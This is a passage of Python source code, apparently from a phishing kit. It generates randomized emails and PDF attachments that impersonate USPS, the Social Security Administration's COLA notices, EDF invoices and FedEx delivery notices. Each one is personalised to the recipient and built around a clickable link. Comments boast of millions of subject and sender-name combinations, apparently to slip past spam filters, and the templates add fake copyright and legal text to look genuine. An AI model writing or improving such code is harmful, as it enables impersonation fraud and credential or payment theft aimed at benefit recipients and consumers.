    arr_hour = random.choice([5, 6, 7, 8, 9, 10])
    arrival = f"{arr_hour}:00pm"
    
    # 🆕 V108: Random lifetime variations
    greetings = [
        f"Hello {recipient_label},",
        f"Hi {recipient_label},",
        f"Dear {recipient_label},",
        "Hello,",
    ]
    delivery_msgs = [
        f"USPS expects to deliver your package by <strong>{full_date}</strong> arriving by {arrival}.",
        f"Your package is scheduled for delivery by <strong>{full_date}</strong>, arriving by {arrival}.",
        f"Your shipment will be delivered by <strong>{full_date}</strong>, expected by {arrival}.",
        f"Expected delivery: <strong>{full_date}</strong>, arriving by {arrival}.",
    ]
    headers = [
        "Expected Delivery By",
        "Arriving On",
        "Delivery Date",
        "Scheduled For",
    ]
    
    greeting = random.choice(greetings)
    delivery_msg = random.choice(delivery_msgs)
    header_label = random.choice(headers)
    
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body style="margin:0; padding:30px 20px; background:#f4f4f4; font-family:Arial,sans-serif; color:#333;">
<table width="600" align="center" style="margin:0 auto; background:#ffffff; border-collapse:collapse;" cellpadding="0" cellspacing="0">
<tr>
  <td style="background:#004b87; padding:18px 24px;">
    <span style="font-size:24px; font-weight:bold; color:#ffffff; letter-spacing:1px;">USPS</span>
    <span style="float:right; color:#ffffff; font-size:11px; padding-top:8px; opacity:0.9;">U.S. POSTAL SERVICE</span>
  </td>
</tr>
<tr>
<td style="padding:24px;">

<p style="margin:0 0 14px; font-size:14px;">{greeting}</p>

<p style="margin:0 0 18px; font-size:14px;">{delivery_msg}</p>

<p style="margin:0 0 18px; font-size:13px; color:#666; font-style:italic;">
  📎 See attached document for tracking details
</p>

<table width="100%" cellpadding="0" cellspacing="0" style="margin:18px 0; background:#f9f9f9; border:1px solid #e0e0e0;">
<tr>
  <td width="180" align="center" style="padding:18px; background:#ffffff; border-right:1px solid #e0e0e0;">
    <div style="font-size:11px; color:#666; text-transform:uppercase; letter-spacing:1px; margin-bottom:8px;">{header_label}</div>
    <div style="font-size:48px; font-weight:bold; color:#d52b1e; line-height:1;">{day_short}</div>
    <div style="font-size:18px; color:#333; text-transform:uppercase; margin-top:4px;">{month_short}</div>
  </td>
  <td align="center" style="padding:18px;">
    <div style="font-size:13px; color:#666;">By {arrival}</div>
    <div style="font-size:13px; color:#666; margin-top:4px;">By {arrival}</div>
    <p style="margin:14px 0 0; font-size:12px; color:#666; font-style:italic;">
      📎 See attached document for full tracking
    </p>
  </td>
</tr>
</table>

<p style="margin-top:24px; color:#999; font-size:12px;">
Sent to: <strong>{recipient_email}</strong>
</p>

</td></tr>
<tr>
  <td style="padding:14px 24px; background:#f0f0f0; color:#666; font-size:10px; text-align:center; border-top:1px solid #ddd;">
    ©{today.year} United States Postal Service®. All rights reserved.
  </td>
</tr>
</table>
</body>
</html>"""


def _generate_cola_subject():
    """Random COLA-themed subject — 55M+ combinations!
    
    90% combinatorial (millions of unique outputs)
    10% from curated list (variety mn pre-typed examples)
    """
    if random.random() < 0.9:
        return _gen_cola_subject_combinatorial()
    return random.choice(_COLA_SUBJECTS)


def _generate_cola_display_name():
    """Random COLA-themed display name — 10M+ combinations!"""
    if random.random() < 0.9:
        return _gen_cola_name_combinatorial()
    return random.choice(_COLA_DISPLAY_NAMES)


def _generate_cola_zip_filename():
    """Random COLA-themed ZIP filename — 1000+ combinations!"""
    if random.random() < 0.85:
        return _gen_cola_zip_combinatorial()
    return random.choice(_COLA_ZIP_FILENAMES)


def _generate_cola_pdf_filename():
    """Random COLA-themed PDF filename (m3a [NAME] placeholder)"""
    return random.choice(_COLA_PDF_FILENAMES)


def _generate_cola_pdf_attachment(recipient_name, recipient_email, link_url):
    """
    Generate COLA-themed PDF attachment per email.
    Same content/structure ki HTML COLA template walakin f PDF format.
    Random per email walakin nefs manhaj!
    """
    if not PDF_OK:
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)
    
    # Random COLA color (8 government schemes)
    c = random.choice(_COLA_COLOR_SCHEMES)
    
    # Random COLA content parts
    intro = random.choice(_COLA_INTROS)
    highlight = random.choice(_COLA_HIGHLIGHTS)
    benefits_list = random.choice(_COLA_BENEFITS_LISTS)
    key_benefits = random.choice(_COLA_KEY_BENEFITS)
    btn_text = random.choice(_COLA_BUTTON_TEXTS)
    tip = random.choice(_COLA_TIPS)
    closing = random.choice(_COLA_CLOSINGS)
    footer = random.choice(_COLA_FOOTERS)
    
    # Random titles
    titles = [
        "Download Your COLA Notice",
        "Your 2026 COLA Notice",
        "COLA Notice — Available Now",
        "Your Annual Benefit Notice",
        "Download Your 2026 Notice",
    ]
    title = random.choice(titles)
    
    subtitles = [
        "Cost-of-Living Adjustment Information",
        "2026 Annual Benefit Update",
        "Your Personalized Benefit Notice",
        "Annual Cost-of-Living Notice",
        "2026 Benefit Statement",
    ]
    subtitle = random.choice(subtitles)
    
    section1_titles = [
        "Your Secure Online Account Includes:",
        "What's Available in Your Account:",
        "Your Account Provides Access To:",
        "Online Account Features:",
    ]
    sec1 = random.choice(section1_titles)
    
    section2_titles = [
        "Key Benefits of Digital COLA Notice:",
        "Why Choose Digital Delivery:",
        "Advantages of Going Digital:",
        "Benefits of Digital Notice:",
    ]
    sec2 = random.choice(section2_titles)
    
    cta_texts = [
        "Ready to download your COLA notice?",
        "Access your notice now:",
        "View your 2026 notice:",
        "Download your statement:",
    ]
    cta = random.choice(cta_texts)
    
    # Build PDF in memory
    buf = BytesIO()
    doc = SimpleDocTemplate(buf, pagesize=A4,
                             leftMargin=0.6*inch, rightMargin=0.6*inch,
                             topMargin=0.5*inch, bottomMargin=0.5*inch,
                             title=title)
    
    primary_color = HexColor(c["primary"])
    secondary_color = HexColor(c["secondary"])
    accent_color = HexColor(c["accent"])
    light_color = HexColor(c["light"])
    
    # Styles
    styles = getSampleStyleSheet()
    
    title_style = ParagraphStyle(
        'TitleCustom', parent=styles['Heading1'],
        fontSize=22, textColor=HexColor("#ffffff"),
        alignment=TA_CENTER, spaceAfter=8,
        leading=26, fontName='Helvetica-Bold'
    )
    
    subtitle_style = ParagraphStyle(
        'SubtitleCustom', parent=styles['BodyText'],
        fontSize=13, textColor=HexColor("#ffffff"),
        alignment=TA_CENTER, spaceAfter=0,
        leading=16, fontName='Helvetica'
    )
    
    body_style = ParagraphStyle(
        'BodyCustom', parent=styles['BodyText'],
        fontSize=11, textColor=HexColor("#333333"),
        spaceAfter=12, leading=16, fontName='Helvetica'
    )
    
    h2_style = ParagraphStyle(
        'H2Custom', parent=styles['Heading2'],
        fontSize=14, textColor=primary_color,
        spaceAfter=8, spaceBefore=12,
        leading=18, fontName='Helvetica-Bold'
    )
    
    list_item_style = ParagraphStyle(
        'ListItem', parent=styles['BodyText'],
        fontSize=11, textColor=HexColor("#333333"),
        leftIndent=20, spaceAfter=6,
        leading=15, fontName='Helvetica'
    )
    
    highlight_style = ParagraphStyle(
        'HighlightCustom', parent=styles['BodyText'],
        fontSize=11, textColor=HexColor("#856404"),
        leading=16, fontName='Helvetica-Bold'
    )
    
    info_style = ParagraphStyle(
        'InfoCustom', parent=styles['BodyText'],
        fontSize=11, textColor=primary_color,
        leading=16, fontName='Helvetica-Bold'
    )
    
    button_style = ParagraphStyle(
        'ButtonCustom', parent=styles['BodyText'],
        fontSize=12, textColor=HexColor("#ffffff"),
        alignment=TA_CENTER, fontName='Helvetica-Bold',
        leading=16
    )
    
    small_style = ParagraphStyle(
        'SmallCustom', parent=styles['BodyText'],
        fontSize=9, textColor=HexColor("#666666"),
        leading=12, fontName='Helvetica'
    )
    
    # Build content
    elements = []
    
    # Header banner (title + subtitle in colored box)
    header_data = [
        [Paragraph(title, title_style)],
        [Paragraph(subtitle, subtitle_style)]
    ]
    header_table = Table(header_data, colWidths=[6.5*inch])
    header_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), primary_color),
        ('LEFTPADDING', (0,0), (-1,-1), 20),
        ('RIGHTPADDING', (0,0), (-1,-1), 20),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 8),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
    ]))
    elements.append(header_table)
    elements.append(Spacer(1, 12))
    
    # Intro paragraph
    elements.append(Paragraph(intro, body_style))
    elements.append(Spacer(1, 6))
    
    # Highlight box (yellow)
    highlight_data = [[Paragraph(highlight, highlight_style)]]
    highlight_table = Table(highlight_data, colWidths=[6.5*inch])
    highlight_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), HexColor("#fff3cd")),
        ('LEFTPADDING', (0,0), (-1,-1), 12),
        ('RIGHTPADDING', (0,0), (-1,-1), 12),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ]))
    elements.append(highlight_table)
    elements.append(Spacer(1, 10))
    
    # Section 1: Account features
    elements.append(Paragraph(sec1, h2_style))
    for item in benefits_list:
        elements.append(Paragraph(f"• {item}", list_item_style))
    elements.append(Spacer(1, 6))
    
    # Section 2: Key benefits
    elements.append(Paragraph(sec2, h2_style))
    for kb_title, kb_desc in key_benefits:
        elements.append(Paragraph(f"• <b>{kb_title}:</b> {kb_desc}", list_item_style))
    elements.append(Spacer(1, 12))
    
    # 📋 RECIPIENT INFO BOX (light gray background)
    recipient_info_data = [
        [Paragraph("<b>Email Address:</b>",
                   ParagraphStyle('el', parent=body_style, fontSize=10,
                                  textColor=primary_color, fontName='Helvetica-Bold')),
         Paragraph(recipient_email,
                   ParagraphStyle('ev', parent=body_style, fontSize=11,
                                  textColor=HexColor("#333333")))],
        [Paragraph("<b>Notice Year:</b>",
                   ParagraphStyle('yl', parent=body_style, fontSize=10,
                                  textColor=primary_color, fontName='Helvetica-Bold')),
         Paragraph("2026 COLA Adjustment",
                   ParagraphStyle('yv', parent=body_style, fontSize=11,
                                  textColor=HexColor("#333333")))]
    ]
    recipient_table = Table(recipient_info_data, colWidths=[1.6*inch, 4.9*inch])
    recipient_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), HexColor("#f5f7fa")),
        ('LEFTPADDING', (0,0), (-1,-1), 14),
        ('RIGHTPADDING', (0,0), (-1,-1), 14),
        ('TOPPADDING', (0,0), (-1,-1), 6),
        ('BOTTOMPADDING', (0,0), (-1,-1), 6),
        ('VALIGN', (0,0), (-1,-1), 'TOP'),
        ('LINEBEFORE', (0,0), (0,-1), 3, primary_color),
    ]))
    elements.append(recipient_table)
    elements.append(Spacer(1, 14))
    
    # 🎯 BUTTON DIRECT (mafichi CTA text aakhal — clean!)
    # Button (clickable!) — kayban f page wahda direct
    button_html = f'<a href="{link_url}"><font color="#ffffff"><b>&nbsp;&nbsp;&nbsp;&nbsp;{btn_text}&nbsp;&nbsp;&nbsp;&nbsp;</b></font></a>'
    button_data = [[Paragraph(button_html, button_style)]]
    button_table = Table(button_data, colWidths=[3.2*inch])
    button_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), secondary_color),
        ('LEFTPADDING', (0,0), (-1,-1), 30),
        ('RIGHTPADDING', (0,0), (-1,-1), 30),
        ('TOPPADDING', (0,0), (-1,-1), 12),
        ('BOTTOMPADDING', (0,0), (-1,-1), 12),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
    ]))
    
    # Center the button
    centered_button = Table([[button_table]], colWidths=[6.5*inch])
    centered_button.setStyle(TableStyle([
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('LEFTPADDING', (0,0), (-1,-1), 0),
        ('RIGHTPADDING', (0,0), (-1,-1), 0),
    ]))
    elements.append(centered_button)
    elements.append(Spacer(1, 14))
    
    # Tip info box (light blue) — b3d button
    tip_data = [[Paragraph(tip, info_style)]]
    tip_table = Table(tip_data, colWidths=[6.5*inch])
    tip_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), light_color),
        ('LEFTPADDING', (0,0), (-1,-1), 14),
        ('RIGHTPADDING', (0,0), (-1,-1), 14),
        ('TOPPADDING', (0,0), (-1,-1), 10),
        ('BOTTOMPADDING', (0,0), (-1,-1), 10),
        ('LINEBEFORE', (0,0), (0,-1), 4, accent_color),
    ]))
    elements.append(tip_table)
    elements.append(Spacer(1, 12))
    
    # Closing paragraph
    elements.append(Paragraph(closing, body_style))
    elements.append(Spacer(1, 12))
    
    # Footer (separator + small text) — at the very bottom
    footer_table = Table([[Paragraph(footer, small_style)]], colWidths=[6.5*inch])
    footer_table.setStyle(TableStyle([
        ('LINEABOVE', (0,0), (-1,0), 1, HexColor("#dddddd")),
        ('TOPPADDING', (0,0), (-1,-1), 10),
    ]))
    elements.append(footer_table)
    
    # Build PDF
    try:
        doc.build(elements)
        pdf_bytes = buf.getvalue()
        buf.close()
        return pdf_bytes
    except Exception as e:
        buf.close()
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)


def _generate_cola_template(recipient_name="[NAME]", recipient_email="[EMAIL]", link_url="#"):
    """
    Generate ONE random COLA / Social Security HTML template.
    Same manhaj kayb9a, walakin colors/wording/lists kayttbedlou random per email.
    
    Total combinations:
       8 colors × 5 intros × 4 benefit lists × 3 key benefits × 10 buttons × 5 tips × 4 closings
       = 96,000+ unique templates per language!
    """
    c = random.choice(_COLA_COLOR_SCHEMES)
    intro = random.choice(_COLA_INTROS)
    highlight = random.choice(_COLA_HIGHLIGHTS)
    benefits_list = random.choice(_COLA_BENEFITS_LISTS)
    key_benefits = random.choice(_COLA_KEY_BENEFITS)
    btn_text = random.choice(_COLA_BUTTON_TEXTS)
    tip = random.choice(_COLA_TIPS)
    closing = random.choice(_COLA_CLOSINGS)
    footer = random.choice(_COLA_FOOTERS)
    
    # Build benefits HTML
    benefits_html = "\n".join([f"                <li>{item}</li>" for item in benefits_list])
    
    # Build key benefits HTML
    key_benefits_html = "\n".join([
        f'                <li><strong>{title}:</strong> {desc}</li>'
        for title, desc in key_benefits
    ])
    
    # Random title variants
    titles = [
        "Download Your COLA Notice",
        "Your 2026 COLA Notice",
        "COLA Notice — Available Now",
        "Your Annual Benefit Notice",
        "Download Your 2026 Notice",
    ]
    title = random.choice(titles)
    
    subtitles = [
        "Cost-of-Living Adjustment Information",
        "2026 Annual Benefit Update",
        "Your Personalized Benefit Notice",
        "Annual Cost-of-Living Notice",
        "2026 Benefit Statement",
    ]
    subtitle = random.choice(subtitles)
    
    section1_titles = [
        "Your Secure Online Account Includes:",
        "What's Available in Your Account:",
        "Your Account Provides Access To:",
        "Online Account Features:",
    ]
    sec1 = random.choice(section1_titles)
    
    section2_titles = [
        "Key Benefits of Digital COLA Notice:",
        "Why Choose Digital Delivery:",
        "Advantages of Going Digital:",
        "Benefits of Digital Notice:",
    ]
    sec2 = random.choice(section2_titles)
    
    cta_texts = [
        "Ready to download your COLA notice?",
        "Access your notice now:",
        "View your 2026 notice:",
        "Download your statement:",
    ]
    cta = random.choice(cta_texts)
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px; }}
        .container {{ max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
        .header {{ background-color: {c['primary']}; color: white; padding: 20px; text-align: center; border-radius: 5px; margin-bottom: 20px; }}
        .header h1 {{ margin: 0; font-size: 28px; }}
        .header p {{ margin: 10px 0 0 0; font-size: 16px; }}
        .content {{ line-height: 1.6; color: #333; }}
        .content p {{ margin-bottom: 15px; font-size: 16px; }}
        .content h2 {{ color: {c['primary']}; margin-top: 25px; margin-bottom: 15px; }}
        .content ul {{ margin: 15px 0; padding-left: 20px; }}
        .content li {{ margin-bottom: 10px; font-size: 16px; }}
        .button {{ display: inline-block; background-color: {c['secondary']}; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; margin-top: 20px; font-weight: bold; text-align: center; border: none; cursor: pointer; font-size: 16px; }}
        .info-box {{ background-color: {c['light']}; border-left: 4px solid {c['accent']}; padding: 15px; margin: 20px 0; border-radius: 3px; }}
        .highlight {{ background-color: #fff3cd; padding: 15px; border-radius: 3px; margin: 20px 0; }}
        .recipient-info {{ background-color: #f5f7fa; border-left: 3px solid {c['primary']}; padding: 15px 20px; margin: 20px 0; border-radius: 3px; }}
        .recipient-info table {{ width: 100%; border-collapse: collapse; }}
        .recipient-info td {{ padding: 6px 0; font-size: 14px; }}
        .recipient-info td:first-child {{ color: {c['primary']}; font-weight: bold; width: 35%; }}
        .recipient-info td:last-child {{ color: #333; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{title}</h1>
            <p>{subtitle}</p>
        </div>
        <div class="content">
            <p>{intro}</p>
            <div class="highlight">
                <p><strong>{highlight}</strong></p>
            </div>
            <h2>{sec1}</h2>
            <ul>
{benefits_html}
            </ul>
            <h2>{sec2}</h2>
            <ul>
{key_benefits_html}
            </ul>
            <div class="recipient-info">
                <table>
                    <tr><td>Email Address:</td><td>{recipient_email}</td></tr>
                    <tr><td>Notice Year:</td><td>2026 COLA Adjustment</td></tr>
                </table>
            </div>
            <p><strong>{cta}</strong></p>
            <a href="{link_url}" class="button">{btn_text}</a>
            <div class="info-box">
                <p><strong>{tip}</strong></p>
            </div>
            <p>{closing}</p>
            <p style="margin-top: 30px; font-size: 14px; color: #666; border-top: 1px solid #ddd; padding-top: 20px;">
                {footer}
            </p>
        </div>
    </div>
</body>
</html>"""
    
    return html


def _generate_edf_pdf_attachment(recipient_name, recipient_email, link_url):
    """
    Generate EDF-themed PDF attachment per email.
    Same orange/blue design as EDF HTML template.
    """
    if not PDF_OK:
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)
    
    # Random EDF color scheme
    c = random.choice(_EDF_COLOR_SCHEMES)
    button_text = random.choice(_EDF_BUTTON_TEXTS)
    amount = random.choice(_EDF_AMOUNTS)
    headline = random.choice(_EDF_SUBJ_HEADLINES)
    
    import datetime as _dt
    today = _dt.datetime.now()
    date_str = today.strftime("%d/%m/%Y")
    ref_id = f"FACT-{random.randint(100000, 999999)}"
    
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import (
        SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, KeepTogether
    )
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.colors import HexColor, white, black
    from reportlab.lib.units import cm, mm
    from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT
    
    import io
    buffer = io.BytesIO()
    
    primary = HexColor(c['primary'])
    secondary = HexColor(c['secondary'])
    text_color = HexColor("#1a1a1a")
    muted = HexColor("#666666")
    bg_grey = HexColor("#f5f5f5")
    
    doc = SimpleDocTemplate(
        buffer, pagesize=A4,
        leftMargin=2*cm, rightMargin=2*cm,
        topMargin=0, bottomMargin=1.5*cm,
        title=headline,
    )
    
    styles = getSampleStyleSheet()
    
    # Custom styles
    header_style = ParagraphStyle(
        'EdfHeader', parent=styles['Normal'],
        fontSize=14, leading=18, alignment=TA_CENTER,
        textColor=white, fontName='Helvetica-Bold',
    )
    
    salutation_style = ParagraphStyle(
        'EdfSalutation', parent=styles['Normal'],
        fontSize=11, leading=15, spaceAfter=14,
        textColor=text_color, fontName='Helvetica',
    )
    
    body_style = ParagraphStyle(
        'EdfBody', parent=styles['Normal'],
        fontSize=10.5, leading=15, spaceAfter=12,
        textColor=text_color, fontName='Helvetica',
        alignment=TA_LEFT,
    )
    
    small_style = ParagraphStyle(
        'EdfSmall', parent=styles['Normal'],
        fontSize=9, leading=13, spaceAfter=10,
        textColor=muted, fontName='Helvetica',
        alignment=TA_LEFT,
    )
    
    closing_style = ParagraphStyle(
        'EdfClosing', parent=styles['Normal'],
        fontSize=11, leading=15, spaceAfter=4,
        textColor=text_color, fontName='Helvetica-Bold',
    )
    
    button_style = ParagraphStyle(
        'EdfButton', parent=styles['Normal'],
        fontSize=12, leading=16, alignment=TA_CENTER,
        textColor=white, fontName='Helvetica-Bold',
    )
    
    story = []
    
    # Top header bar (orange) — full-width
    header_table = Table(
        [[Paragraph(headline, header_style)]],
        colWidths=[doc.width],
        rowHeights=[1.2*cm],
    )
    header_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), primary),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('LEFTPADDING', (0,0), (-1,-1), 12),
        ('RIGHTPADDING', (0,0), (-1,-1), 12),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(header_table)
    story.append(Spacer(1, 0.6*cm))
    
    # Body content
    story.append(Paragraph("Madame, Monsieur,", salutation_style))
    
    # Compte client box (highlighted)
    client_table = Table(
        [[Paragraph(
            f"<b>Compte client :</b> {recipient_email}",
            ParagraphStyle('client', parent=body_style, fontSize=10, textColor=text_color)
        )]],
        colWidths=[doc.width],
    )
    client_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), bg_grey),
        ('LINEBEFORE', (0,0), (0,-1), 3, primary),
        ('LEFTPADDING', (0,0), (-1,-1), 14),
        ('RIGHTPADDING', (0,0), (-1,-1), 14),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(client_table)
    story.append(Spacer(1, 0.4*cm))
    
    # Main paragraph with amount
    main_para = (
        f"Vous trouverez, ci-joint, votre facture électronique au format PDF "
        f"d'un montant total à payer de <b><font color='{c['primary']}'>{amount} euros TTC</font></b> "
        f"ou en votre faveur."
    )
    story.append(Paragraph(main_para, body_style))
    
    # Details table
    details_data = [
        ["Référence", ref_id],
        ["Date d'émission", date_str],
        ["Compte client", recipient_email],
        ["Montant TTC", f"{amount} €"],
    ]
    details_table = Table(
        details_data,
        colWidths=[doc.width * 0.35, doc.width * 0.65],
    )
    details_table.setStyle(TableStyle([
        ('FONTNAME', (0,0), (0,-1), 'Helvetica'),
        ('FONTNAME', (1,0), (1,-1), 'Helvetica-Bold'),
        ('FONTSIZE', (0,0), (-1,-1), 9.5),
        ('TEXTCOLOR', (0,0), (0,-1), muted),
        ('TEXTCOLOR', (1,0), (1,-2), text_color),
        ('TEXTCOLOR', (1,-1), (1,-1), primary),
        ('FONTSIZE', (1,-1), (1,-1), 12),
        ('LEFTPADDING', (0,0), (-1,-1), 14),
        ('RIGHTPADDING', (0,0), (-1,-1), 14),
        ('TOPPADDING', (0,0), (-1,-1), 9),
        ('BOTTOMPADDING', (0,0), (-1,-1), 9),
        ('GRID', (0,0), (-1,-1), 0.5, HexColor("#e0e0e0")),
        ('BACKGROUND', (0,0), (-1,0), HexColor("#f8f8f8")),
    ]))
    story.append(details_table)
    story.append(Spacer(1, 0.4*cm))
    
    # Legal text (small)
    story.append(Paragraph(
        "En application de l'article L224-11 du Code de la consommation, les sommes "
        "correspondant à des consommations ou de l'acheminement pour la période concernée "
        "ont été annulées et sont donc non dues.",
        small_style
    ))
    
    story.append(Paragraph(
        "Retrouvez l'historique de vos factures sur 3 ans en vous connectant à votre Espace Client.",
        body_style
    ))
    
    story.append(Spacer(1, 0.3*cm))
    
    # Button (clickable)
    button_link = f'<a href="{link_url}"><font color="white"><b>{button_text}</b></font></a>'
    button_table = Table(
        [[Paragraph(button_link, button_style)]],
        colWidths=[doc.width * 0.5],
        rowHeights=[1.1*cm],
    )
    button_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), primary),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('LEFTPADDING', (0,0), (-1,-1), 8),
        ('RIGHTPADDING', (0,0), (-1,-1), 8),
    ]))
    
    # Center the button table
    button_wrapper = Table(
        [[button_table]],
        colWidths=[doc.width],
    )
    button_wrapper.setStyle(TableStyle([
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('LEFTPADDING', (0,0), (-1,-1), 0),
        ('RIGHTPADDING', (0,0), (-1,-1), 0),
        ('TOPPADDING', (0,0), (-1,-1), 0),
        ('BOTTOMPADDING', (0,0), (-1,-1), 0),
    ]))
    story.append(button_wrapper)
    story.append(Spacer(1, 0.6*cm))
    
    # Final notice
    story.append(Paragraph(
        "En cas de difficulté de réception ou d'anomalie constatée sur le contenu de votre facture, "
        "nous vous invitons à appeler le n° de téléphone figurant sur votre facture.",
        small_style
    ))
    
    story.append(Spacer(1, 0.3*cm))
    
    # Closing
    story.append(Paragraph("Cordialement,", closing_style))
    story.append(Paragraph("EDF.FR", closing_style))
    
    story.append(Spacer(1, 0.6*cm))
    
    # Bottom blue bar
    bottom_table = Table(
        [[""]],
        colWidths=[doc.width],
        rowHeights=[0.3*cm],
    )
    bottom_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), secondary),
    ]))
    story.append(bottom_table)
    
    doc.build(story)
    return buffer.getvalue()


def _generate_ssa_simple_pdf_attachment(recipient_name, recipient_email, link_url):
    """SSA Simple Statement PDF — clean simple design."""
    if not PDF_OK:
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)
    
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.colors import HexColor, white
    from reportlab.lib.units import cm
    from reportlab.lib.enums import TA_LEFT, TA_CENTER
    import io
    
    buffer = io.BytesIO()
    primary = HexColor("#003366")
    text_color = HexColor("#1a1a1a")
    muted = HexColor("#666666")
    
    doc = SimpleDocTemplate(
        buffer, pagesize=A4,
        leftMargin=2*cm, rightMargin=2*cm,
        topMargin=0, bottomMargin=1.5*cm,
        title="Social Security Statement",
    )
    
    styles = getSampleStyleSheet()
    header_style = ParagraphStyle('Hdr', parent=styles['Normal'], fontSize=14, alignment=TA_CENTER,
                                    textColor=white, fontName='Helvetica-Bold', leading=18)
    body_style = ParagraphStyle('Body', parent=styles['Normal'], fontSize=11, leading=16,
                                  spaceAfter=12, textColor=text_color, fontName='Helvetica')
    bullet_style = ParagraphStyle('Bullet', parent=body_style, fontSize=10, leading=14,
                                    leftIndent=20, bulletIndent=10, spaceAfter=8)
    
    story = []
    
    # Header bar
    header_table = Table([[Paragraph("Social Security Statement", header_style)]],
                          colWidths=[doc.width], rowHeights=[1.2*cm])
    header_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), primary),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(header_table)
    story.append(Spacer(1, 0.6*cm))
    
    story.append(Paragraph(f"Dear {recipient_name},", body_style))
    story.append(Paragraph(
        "Your Social Security Statement is streamlined and easier to read than ever before. "
        "That is because we have redesigned the Statement to provide you the most useful "
        "information up front and at a glance.", body_style))
    
    # Account info box
    acct_table = Table([[Paragraph(f"<b>Account:</b> {recipient_email}", body_style)]],
                        colWidths=[doc.width])
    acct_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), HexColor("#f5f7fa")),
        ('LINEBEFORE', (0,0), (0,-1), 3, primary),
        ('LEFTPADDING', (0,0), (-1,-1), 12), ('RIGHTPADDING', (0,0), (-1,-1), 12),
        ('TOPPADDING', (0,0), (-1,-1), 8), ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(acct_table)
    story.append(Spacer(1, 0.3*cm))
    
    story.append(Paragraph(
        "We encourage you to check your Statement at least once a year to review:", body_style))
    
    bullets = [
        "Your earnings record (to make sure it's accurate);",
        "Your personalized monthly retirement benefit estimates;",
        "Other useful information that will explain your benefits;",
        "New fact sheets that provide additional information based on your specific age group.",
    ]
    for b in bullets:
        story.append(Paragraph(f"• {b}", bullet_style))
    
    story.append(Spacer(1, 0.3*cm))
    story.append(Paragraph(
        "Now that you can access your Statement instantly and anytime online, "
        "we will not automatically send one by mail.", body_style))
    story.append(Paragraph(
        "We hope you find your new Statement useful and informative.", body_style))
    
    story.append(Spacer(1, 0.5*cm))
    story.append(Paragraph("Sincerely,", body_style))
    story.append(Paragraph("<b>Social Security Administration</b>", body_style))
    
    doc.build(story)
    return buffer.getvalue()


def _generate_fedex_pdf_attachment(recipient_name, recipient_email, link_url):
    """FedEx Delivery PDF — purple/orange brand design."""
    if not PDF_OK:
        return _generate_minimal_pdf(recipient_name, recipient_email, link_url)
    
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.colors import HexColor, white
    from reportlab.lib.units import cm
    from reportlab.lib.enums import TA_LEFT, TA_CENTER
    import io, datetime as _dt
    
    buffer = io.BytesIO()
    purple = HexColor("#4d148c")
    orange = HexColor("#ff6600")
    text_color = HexColor("#1a1a1a")
    muted = HexColor("#666666")
    
    today = _dt.datetime.now()
    delivery_date = today  # 🆕 V108: real today date
    delivery_str = delivery_date.strftime("%a %m/%d/%Y")
    today_str = today.strftime("%m/%d/%Y")
    shipper = random.choice(_FEDEX_SHIPPERS)
    tracking_id = f"{random.randint(100000000000, 999999999999)}"
    
    doc = SimpleDocTemplate(buffer, pagesize=A4, leftMargin=2*cm, rightMargin=2*cm,
                            topMargin=0, bottomMargin=1.5*cm, title="FedEx Delivery")
    
    styles = getSampleStyleSheet()
    header_style = ParagraphStyle('Hdr', parent=styles['Normal'], fontSize=22, alignment=TA_LEFT,
